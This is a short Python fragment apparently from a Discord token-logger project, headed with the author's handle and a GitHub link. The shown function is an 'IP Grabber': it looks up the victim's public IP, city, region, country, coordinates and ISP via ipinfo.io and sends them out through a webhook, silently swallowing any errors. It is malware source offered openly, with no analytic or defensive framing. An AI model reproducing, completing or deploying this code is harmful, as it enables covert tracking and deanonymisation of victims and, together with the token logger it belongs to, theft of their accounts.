# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# IP Grabber
def send_ip_():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5)
        r.raise_for_status()
        data = r.json()
        ip = data.get("ip")
        city = data.get("city")
        region = data.get("region")
        country = data.get("country")
        loc = data.get("loc")
        org = data.get("org")
        send_webhook(f"IP: {ip}\n Location: {city}, {region}, {country}\nCoords: {loc}\nISP: {org}", title="Location Info", encrypt=False)
    except Exception as e:
        print(f"")